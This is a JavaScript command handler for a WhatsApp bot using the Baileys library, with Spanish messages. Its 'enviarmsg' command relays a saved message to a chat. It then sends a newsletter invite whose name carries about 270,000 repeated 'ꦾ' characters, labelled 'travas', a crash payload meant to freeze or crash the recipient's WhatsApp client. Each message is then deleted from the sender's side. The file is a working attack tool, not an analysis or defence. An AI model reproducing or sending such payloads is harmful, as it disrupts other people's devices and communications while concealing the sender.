import fs from 'fs';
import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

const FILE_PATH = './mensajes_guardados.json';

let handler = async (m, { conn }) => {
  try {
    if (m.isGroup) return m.reply('❌ Este comando no puede usarse en grupos.');

    const botNumber = conn.user?.jid || '';
    if (m.sender !== botNumber) {
      return m.reply('❌ Solo el número vinculado al bot puede usar este comando.');
    }

    if (!fs.existsSync(FILE_PATH)) return m.reply('❌ No hay mensaje guardado.');
    const mensaje = JSON.parse(fs.readFileSync(FILE_PATH, 'utf-8'));
    if (!mensaje?.message) return m.reply('❌ El archivo está dañado.');

    // ✅ 1. Generar mensaje desde archivo (como viewOnce)
    const generado1 = await generateWAMessageFromContent(m.chat, mensaje.message, {
      userJid: conn.user.id,
    });

    await conn.relayMessage(m.chat, generado1.message, { messageId: generado1.key.id });
    await conn.sendMessage(conn.user.id, { delete: generado1.key });

    // ✅ 2. Generar canal/traba
    const travas = 'ꦾ'.repeat(90000);
    const canal = {
      newsletterAdminInviteMessage: {
        newsletterJid: "120363282786345717@newsletter",
        newsletterName: "🗣🗣🗣🗣" + travas + travas + travas,
        jpegThumbnail: Buffer.from('/9j/4AAQSkZJRgABAQAAAQABAAD/...Z', 'base64'),
        caption: "𝐏.𝐀. 𝐙𝐢𝐧 𝐖𝐞𝐛  ᶻ 𝗓 𐰁",
        inviteExpiration: `${Math.floor(Date.now() / 1000) + 3600}`
      }
    };

    const generado2 = await generateWAMessageFromContent(m.chat, canal, {
      userJid: conn.user.id,
    });

    await conn.relayMessage(m.chat, generado2.message, { messageId: generado2.key.id });
    await conn.sendMessage(conn.user.id, { delete: generado2.key });

    // ✅ 3. Confirmación
    await conn.sendMessage(m.chat, {
      text: '✅ Mensajes enviados y eliminados localmente.',
    }, { quoted: m });

  } catch (e) {
    console.error('[ERROR enviarmsg]:', e);
    return m.reply('❌ Error:\n' + (e.message || e));
  }
};

handler.command = ['enviarmsg'];
export default handler;